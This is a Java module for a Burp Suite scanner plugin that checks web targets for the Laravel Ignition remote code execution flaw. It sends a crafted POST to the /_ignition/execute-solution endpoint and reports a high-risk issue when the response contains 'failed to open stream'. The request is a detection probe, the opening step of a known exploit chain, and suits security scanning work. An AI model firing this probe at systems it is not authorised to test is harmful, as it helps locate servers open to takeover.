package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.Confidence;
import burp.scan.lib.GlobalFunction;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtRequest;
import burp.scan.lib.web.utils.GtResponse;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;

public class LaravelIgnitionRCE implements ModuleBase, RunOnce {
    boolean isMatch(byte[] body) {
        String sBody = new String(body);
        if (sBody.contains("failed to open stream")) {

            return true;
        }
        return false;
    }
    static String payload = "POST /_ignition/execute-solution HTTP/1.1\n" +
            "Host: %s\n" +
            "Accept: */*\n" +
            "Accept-Language: en\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\n" +
            "Connection: close\n" +
            "Content-Type: application/json\n" +
            "Content-Length: 328\n" +
            "\n" +
            "{\n" +
            "  \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n" +
            "  \"parameters\": {\n" +
            "    \"variableName\": \"username\",\n" +
            "    \"viewFile\": \"xxxxxxxxxxxx\"\n" +
            "  }\n" +
            "}";
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        GtURL url = new GtURL(webInfo.getUrl());
        boolean https = url.isHttps();
        String targetPayload = String.format(payload,url.getHost());
        GtSession session = GtSession.getGlobalSession();
        GtRequest request = new GtRequest(targetPayload.getBytes(),https);
        callbacks.printOutput("Test Request:"+new String(request.raw()));
        try {
            GtResponse response = session.sendRequest(request);
            var body = response.getBody();
            if (isMatch(body)) {
                IScanIssue issue = new GtScanIssue(
                        response.getRequestResponse().getHttpService(),
                        new GtURL(request.getUrl()).getURL(),
                        response.getRequestResponse(),
                        "Laravel Ignition RCE",
                        "https://www.ambionics.io/blog/laravel-debug-rce\n" +
                                "https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g",
                        "",
                        Risk.High,
                        Confidence.Certain
                );
                webInfo.addIssue(issue);
                callbacks.addScanIssue(issue);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> result = new HashSet<>();
        result.add(TagUtils.toStandardName(TagTypes.Laravel_PHP));
        return result;
    }
}
